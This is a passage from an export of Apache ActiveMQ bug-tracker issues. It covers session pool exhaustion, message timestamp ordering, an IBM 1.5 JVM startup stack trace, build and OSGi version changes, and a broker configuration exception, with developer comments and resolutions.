Closing a PooledConnection does not seem to return associated sessions to the SessionPool,AMQ-2643,12483604,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,henriko,henriko,09/Mar/10 09:37,07/Oct/11 13:52,14/Jul/23 05:43,07/Oct/11 13:52,5.2.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"Reading the documentation at http://java.sun.com/j2ee/1.4/docs/api/javax/jms/Connection.html#close() one would assume the associated session(s) would be closed/returned to the SessionPool when closing a connection: ""There is no need to close the sessions, producers, and consumers of a closed connection.""

But it seems if you don't also explicitly call close() on the session you will run out of Session objects in the SessionPool. 
Looking at http://www.google.com/codesearch/p?hl=en#coOE0tRomSs/trunk/activemq-core/src/main/java/org/apache/activemq/pool/PooledConnection.java&d=9&l=69 trunk seems to have the same behaviour.",,fredrikj,henriko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Oct/11 13:22;tabish;PooledSessionExhaustionTest.java;https://issues.apache.org/jira/secure/attachment/12497632/PooledSessionExhaustionTest.java","28/Sep/11 09:03;henriko;SimpleTest.java;https://issues.apache.org/jira/secure/attachment/12496860/SimpleTest.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,33650,,,Fri Oct 07 13:52:22 UTC 2011,,,,,,,,,,,"0|i0akjj:",59601,,,,,,,,,,,,,,,,,,,,,"27/Sep/11 20:48;tabish;Not test case provided which would be needed to reproduce the issue in question.;;;","28/Sep/11 09:02;henriko;Still a bug, tested against 5.5.0. Making a test case;;;","28/Sep/11 09:05;henriko;Attached a test case showing that continously requesting a connection (and a a session) from a ConnectionFactory that happens to be a PooledConnectionFactory and only closing the connection, not the session, eventually exhausts the session pool. This seems to break the contract of Connection.close since the official documentation for it states that ""There is no need to close the sessions, producers, and consumers of a closed connection."";;;","04/Oct/11 13:22;tabish;Create a usable JUnit test based on the initial test case.  This one will throw an exception if sessions are exhausted and creates its own BrokerService.  ;;;","07/Oct/11 13:52;tabish;Fix applied in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Timestamp Order,AMQ-2641,12483737,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,ggvv25,ggvv25,08/Mar/10 18:28,20/Sep/11 11:01,14/Jul/23 05:43,20/Sep/11 11:01,5.3.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Hi all,
II have 10 producers, 1 consumer and 1 broker activemq.
Producers send 1 message in the same time in a queue.
The problem is that the timestamp order I visualize in the manager (http://localhost:8161/admin) is incorrect and so messages order is wrong.
How can I solve the problem?

Best regards,
Vincenzo

",Linux 64bit,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60045,,,Tue Sep 20 11:01:36 UTC 2011,,,,,,,,,,,"0|i0akjr:",59602,,,,,,,,,,,,,,,,,,,,,"08/Mar/10 18:37;tjsnell;Timestamps are set on the client. Are you sure the clocks on the producer machines are synced? 

If you have no control over the client machines you could use the timestamp plugin

http://activemq.apache.org/timestampplugin.html;;;","08/Mar/10 18:46;bsnyder;Timestamps are not used for sorting the visual order of messages in the web console. ;;;","08/Mar/10 21:06;ggvv25;Thanks Trace and Bruce.
I have already used timestampplugin but the problem is the same.
Bruce, what is the role played by Timestamps of a message?

When the only consumer consumes a message it records in database table the message and the timestamp associate with it (behalf      Message.getJMSTimestamp ()) and I think: If i order by timestamp the records in the table, I obtain the same message order as it was in the queue.
I want to preserve the order behalf timestamp setted by the broker.
 
Is it possible? Or I have to solve in another way?

Thanks in advance.

Vincenzo;;;","08/Mar/10 23:20;bsnyder;The web consolejust uses JMX and a queue browser to look into the broker to get a peek at the messages at that particular instant. The web console is not concerned with order of the messages and is completely separate from message consumption. 

Are you seeking to consume the messages in the order that they were received by the broker? If so, check out [total ordering with the strict order dispatch policy|http://activemq.apache.org/total-ordering.html]. That is a broker feature that must be configured in the {{activemq.xml}}. It will not affect the display of messages in the web console, only the order in which messages are dispatched to the a consumer subscription. ;;;","09/Jul/11 21:30;tabish;This doesn't appear to be a problem, just a lack of configuration for the desired results.;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Annotation error with IBM 1.5 JVM,AMQ-2639,12483686,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,hgomez,hgomez,08/Mar/10 07:27,20/Sep/11 11:01,14/Jul/23 05:43,20/Sep/11 11:01,5.3.0,,,,,5.6.0,,,,,,,1,,,,,,,,,"When I launch ActiveMQ 5.3.0 with an IBM 1.5.0 JVM I see the following error :

jvm 1    |  INFO | Connector vm://localhost Started
jvm 1    | ERROR | failed Jersey Filter
jvm 1    | java.lang.TypeNotPresentException: Type javax.annotation.PreDestroy not present
jvm 1    | 	at com.ibm.oti.reflect.AnnotationHelper.getAnnotation(AnnotationHelper.java:38)
jvm 1    | 	at com.ibm.oti.reflect.AnnotationHelper.getDeclaredAnnotations(AnnotationHelper.java:50)
jvm 1    | 	at com.ibm.oti.reflect.Method.getDeclaredAnnotations(Method.java:31)
jvm 1    | 	at java.lang.reflect.Method.getDeclaredAnnotations(Method.java:722)
jvm 1    | 	at java.lang.reflect.AccessibleObject.getAnnotations(AccessibleObject.java:191)
jvm 1    | 	at com.sun.jersey.core.reflection.AnnotatedMethod.hasMetaMethodAnnotations(AnnotatedMethod.java:269)
jvm 1    | 	at com.sun.jersey.core.reflection.AnnotatedMethod.hasAnnotations(AnnotatedMethod.java:262)
jvm 1    | 	at com.sun.jersey.core.reflection.AnnotatedMethod.findAnnotatedMethod(AnnotatedMethod.java:232)
jvm 1    | 	at com.sun.jersey.core.reflection.AnnotatedMethod.findAnnotatedMethod(AnnotatedMethod.java:218)
jvm 1    | 	at com.sun.jersey.core.reflection.AnnotatedMethod.<init>(AnnotatedMethod.java:109)
jvm 1    | 	at com.sun.jersey.core.reflection.MethodList.<init>(MethodList.java:75)
jvm 1    | 	at com.sun.jersey.core.reflection.MethodList.<init>(MethodList.java:57)
jvm 1    | 	at com.sun.jersey.server.impl.modelapi.annotation.IntrospectionModeller.createResource(IntrospectionModeller.java:108)
jvm 1    | 	at com.sun.jersey.server.impl.application.WebApplicationImpl.getAbstractResource(WebApplicationImpl.java:400)
jvm 1    | 	at com.sun.jersey.server.impl.application.WebApplicationImpl.processRootResources(WebApplicationImpl.java:800)
jvm 1    | 	at com.sun.jersey.server.impl.application.WebApplicationImpl.initiate(WebApplicationImpl.java:645)
jvm 1    | 	at com.sun.jersey.spi.spring.container.servlet.SpringServlet.initiate(SpringServlet.java:97)
jvm 1    | 	at com.sun.jersey.spi.container.servlet.ServletContainer$InternalWebComponent.initiate(ServletContainer.java:242)
jvm 1    | 	at com.sun.jersey.spi.container.servlet.WebComponent.load(WebComponent.java:455)
jvm 1    | 	at com.sun.jersey.spi.container.servlet.WebComponent.init(WebComponent.java:178)
jvm 1    | 	at com.sun.jersey.spi.container.servlet.ServletContainer.init(ServletContainer.java:281)
jvm 1    | 	at com.sun.jersey.spi.container.servlet.ServletContainer.init(ServletContainer.java:613)
jvm 1    | 	at org.mortbay.jetty.servlet.FilterHolder.doStart(FilterHolder.java:97)
jvm 1    | 	at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:39)
jvm 1    | 	at org.mortbay.jetty.servlet.ServletHandler.initialize(ServletHandler.java:589)
jvm 1    | 	at org.mortbay.jetty.servlet.Context.startContext(Context.java:139)
jvm 1    | 	at org.mortbay.jetty.webapp.WebAppContext.startContext(WebAppContext.java:1220)
jvm 1    | 	at org.mortbay.jetty.handler.ContextHandler.doStart(ContextHandler.java:510)
jvm 1    | 	at org.mortbay.jetty.webapp.WebAppContext.doStart(WebAppContext.java:448)
jvm 1    | 	at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:39)
jvm 1    | 	at org.mortbay.jetty.handler.HandlerCollection.doStart(HandlerCollection.java:152)
jvm 1    | 	at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:39)
jvm 1    | 	at org.mortbay.jetty.handler.HandlerWrapper.doStart(HandlerWrapper.java:130)
jvm 1    | 	at org.mortbay.jetty.Server.doStart(Server.java:222)
jvm 1    | 	at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:39)
jvm 1    | 	at org.mortbay.jetty.xbean.JettyFactoryBean.run(JettyFactoryBean.java:47)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:79)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:618)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1414)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1375)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
jvm 1    | 	at java.security.AccessController.doPrivileged(AccessController.java:214)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
jvm 1    | 	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
jvm 1    | 	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
jvm 1    | 	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
jvm 1    | 	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
jvm 1    | 	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
jvm 1    | 	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
jvm 1    | 	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
jvm 1    | 	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
jvm 1    | 	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
jvm 1    | 	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:129)
jvm 1    | 	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
jvm 1    | 	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:79)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:79)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:618)
jvm 1    | 	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
jvm 1    | 	at org.apache.activemq.console.Main.main(Main.java:107)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:79)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:618)
jvm 1    | 	at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240)
jvm 1    | 	at java.lang.Thread.run(Thread.java:811)
jvm 1    | Caused by: 
jvm 1    | java.lang.ClassNotFoundException: javax.annotation.PreDestroy
jvm 1    | 	at java.lang.Class.forNameImpl(Native Method)
jvm 1    | 	at java.lang.Class.forName(Class.java:163)
jvm 1    | 	at com.ibm.oti.reflect.AnnotationHelper.getAnnotation(AnnotationHelper.java:33)
jvm 1    | 	... 78 more
jvm 1    | ERROR | Failed startup of context org.mortbay.jetty.webapp.WebAppContext@4fb04fb0{/camel,file:/home/apache-activemq-5.3.0/webapps/camel/}
jvm 1    | java.lang.TypeNotPresentException: Type javax.annotation.PreDestroy not present
jvm 1    | 	at com.ibm.oti.reflect.AnnotationHelper.getAnnotation(AnnotationHelper.java:38)
jvm 1    | 	at com.ibm.oti.reflect.AnnotationHelper.getDeclaredAnnotations(AnnotationHelper.java:50)
jvm 1    | 	at com.ibm.oti.reflect.Method.getDeclaredAnnotations(Method.java:31)
jvm 1    | 	at java.lang.reflect.Method.getDeclaredAnnotations(Method.java:722)
jvm 1    | 	at java.lang.reflect.AccessibleObject.getAnnotations(AccessibleObject.java:191)
jvm 1    | 	at com.sun.jersey.core.reflection.AnnotatedMethod.hasMetaMethodAnnotations(AnnotatedMethod.java:269)
jvm 1    | 	at com.sun.jersey.core.reflection.AnnotatedMethod.hasAnnotations(AnnotatedMethod.java:262)
jvm 1    | 	at com.sun.jersey.core.reflection.AnnotatedMethod.findAnnotatedMethod(AnnotatedMethod.java:232)
jvm 1    | 	at com.sun.jersey.core.reflection.AnnotatedMethod.findAnnotatedMethod(AnnotatedMethod.java:218)
jvm 1    | 	at com.sun.jersey.core.reflection.AnnotatedMethod.<init>(AnnotatedMethod.java:109)
jvm 1    | 	at com.sun.jersey.core.reflection.MethodList.<init>(MethodList.java:75)
jvm 1    | 	at com.sun.jersey.core.reflection.MethodList.<init>(MethodList.java:57)
jvm 1    | 	at com.sun.jersey.server.impl.modelapi.annotation.IntrospectionModeller.createResource(IntrospectionModeller.java:108)
jvm 1    | 	at com.sun.jersey.server.impl.application.WebApplicationImpl.getAbstractResource(WebApplicationImpl.java:400)
jvm 1    | 	at com.sun.jersey.server.impl.application.WebApplicationImpl.processRootResources(WebApplicationImpl.java:800)
jvm 1    | 	at com.sun.jersey.server.impl.application.WebApplicationImpl.initiate(WebApplicationImpl.java:645)
jvm 1    | 	at com.sun.jersey.spi.spring.container.servlet.SpringServlet.initiate(SpringServlet.java:97)
jvm 1    | 	at com.sun.jersey.spi.container.servlet.ServletContainer$InternalWebComponent.initiate(ServletContainer.java:242)
jvm 1    | 	at com.sun.jersey.spi.container.servlet.WebComponent.load(WebComponent.java:455)
jvm 1    | 	at com.sun.jersey.spi.container.servlet.WebComponent.init(WebComponent.java:178)
jvm 1    | 	at com.sun.jersey.spi.container.servlet.ServletContainer.init(ServletContainer.java:281)
jvm 1    | 	at com.sun.jersey.spi.container.servlet.ServletContainer.init(ServletContainer.java:613)
jvm 1    | 	at org.mortbay.jetty.servlet.FilterHolder.doStart(FilterHolder.java:97)
jvm 1    | 	at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:39)
jvm 1    | 	at org.mortbay.jetty.servlet.ServletHandler.initialize(ServletHandler.java:589)
jvm 1    | 	at org.mortbay.jetty.servlet.Context.startContext(Context.java:139)
jvm 1    | 	at org.mortbay.jetty.webapp.WebAppContext.startContext(WebAppContext.java:1220)
jvm 1    | 	at org.mortbay.jetty.handler.ContextHandler.doStart(ContextHandler.java:510)
jvm 1    | 	at org.mortbay.jetty.webapp.WebAppContext.doStart(WebAppContext.java:448)
jvm 1    | 	at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:39)
jvm 1    | 	at org.mortbay.jetty.handler.HandlerCollection.doStart(HandlerCollection.java:152)
jvm 1    | 	at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:39)
jvm 1    | 	at org.mortbay.jetty.handler.HandlerWrapper.doStart(HandlerWrapper.java:130)
jvm 1    | 	at org.mortbay.jetty.Server.doStart(Server.java:222)
jvm 1    | 	at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:39)
jvm 1    | 	at org.mortbay.jetty.xbean.JettyFactoryBean.run(JettyFactoryBean.java:47)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:79)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:618)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1414)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1375)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
jvm 1    | 	at java.security.AccessController.doPrivileged(AccessController.java:214)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
jvm 1    | 	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
jvm 1    | 	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
jvm 1    | 	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
jvm 1    | 	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
jvm 1    | 	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
jvm 1    | 	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
jvm 1    | 	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
jvm 1    | 	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
jvm 1    | 	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
jvm 1    | 	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
jvm 1    | 	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
jvm 1    | 	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
jvm 1    | 	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:129)
jvm 1    | 	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
jvm 1    | 	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:79)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:79)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:618)
jvm 1    | 	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
jvm 1    | 	at org.apache.activemq.console.Main.main(Main.java:107)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
jvm 1    | 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:79)
jvm 1    | 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
jvm 1    | 	at java.lang.reflect.Method.invoke(Method.java:618)
jvm 1    | 	at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240)
jvm 1    | 	at java.lang.Thread.run(Thread.java:811)
jvm 1    | Caused by: 
jvm 1    | java.lang.ClassNotFoundException: javax.annotation.PreDestroy
jvm 1    | 	at java.lang.Class.forNameImpl(Native Method)
jvm 1    | 	at java.lang.Class.forName(Class.java:163)
jvm 1    | 	at com.ibm.oti.reflect.AnnotationHelper.getAnnotation(AnnotationHelper.java:33)
jvm 1    | 	... 78 more


I didn't see such behaviour with an IBM 1.6.0 JVM or Sun 1.5.0 / 1.6.0.
Some of our futur ActiveMQ targets platform will only have IBM 1.5.0 JVM and couldn't be upgraded to IBM 1.6.0 for a while.

Regards

","Linux Suse SLES 10, IBM 1.5 0-SR11 JVM ",norman,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60043,,,Tue Sep 20 11:01:37 UTC 2011,,,,,,,,,,,"0|i0akjz:",59603,,,,,,,,,,,,,,,,,,,,,"14/Oct/10 13:02;norman;You can add the following jar to the classpath as workaround :

http://mirrors.ibiblio.org/pub/mirrors/maven2/org/apache/geronimo/specs/geronimo-annotation_1.1_spec/1.0.1/geronimo-annotation_1.1_spec-1.0.1.jar

;;;","26/Jan/11 19:09;norman;maybe the activemq devs should just add it to the classpath as default. It does not hurt even on sun jdk.. wdyt ?;;;","01/Jul/11 21:28;tabish;ActiveMQ now requires JDK 1.6.  Reopen if still an issue with latest versions;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Upgrade to apache 7 pom, use more standard release profile",AMQ-2638,12483234,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,djencks,djencks,djencks,05/Mar/10 22:44,05/Mar/10 22:45,14/Jul/23 05:43,05/Mar/10 22:45,5.4.0,,,,,5.4.0,,,,,,,0,,,,,,,,,"Apache 7 pom now has a working apache-release profile, so we can use more of it.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74861,,,Fri Mar 05 22:45:15 UTC 2010,,,,,,,,,,,"0|i0rr8f:",160056,,,,,,,,,,,,,,,,,,,,,"05/Mar/10 22:45;djencks;rev 919659;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
More flexible osgi import version ranges,AMQ-2637,12483419,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,djencks,djencks,djencks,05/Mar/10 19:44,26/Apr/10 10:26,14/Jul/23 05:43,05/Mar/10 19:45,5.3.0,,,,,5.3.2,5.4.0,,,,,,0,,,,,,,,,"In geronimo we need a little wider version ranges in the osgi import-package headers.  For now I'm going to use a bnd pattern [==,+)  that goes from the current minor import version to the next major version.  I'm also including configuration that will work with the next maven-bundle-plugin so that implemented packages have a smaller version range [==,=+) that goes to the next minor version (this is what is used everywhere now).

",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74862,,,Fri Mar 05 19:45:33 UTC 2010,,,,,,,,,,,"0|i0rr8v:",160058,,,,,,,,,,,,,,,,,,,,,"05/Mar/10 19:45;djencks;rev 919561;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Exception on setting ""sendFailIfNoSpaceAfterTimeout""",AMQ-2634,12482988,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,,scoopex,scoopex,02/Mar/10 14:30,02/Mar/10 17:21,14/Jul/23 05:43,02/Mar/10 15:50,5.3.0,,,,,5.3.1,,,Broker,,,,0,,,,,,,,,"I added the follwing configuration to my broker:
---
<systemUsage>
 <systemUsage sendFailIfNoSpaceAfterTimeout=""3000"">
   <memoryUsage>
     <memoryUsage limit=""20 mb""/>
   </memoryUsage>
 </systemUsage>
</systemUsage>
---

I get the following exceptions:
(after removing sendFailIfNoSpaceAfterTimeout the broker start properly)
---
# /etc/init.d/activemq fgstart                                                                                                                                                                                                        
INFO: loading '/etc/default/activemq'                                                                                                                                                                                                 
INFO: useing java '/usr/bin/java'                                                                                                                                                                                                     
INFO: starting in foreground, this is just for debugging purposes (stop process by pressing CTRL+c)                                                                                                                                   
INFO: changing to user 'activemq' to invoke java                                                                                                                                                                                      
Java Runtime: IBM Corporation 1.6.0 /usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre                                                                                                                                                           
  Heap sizes: current=131072k  free=126099k  max=1048576k                                                                                                                                                                             
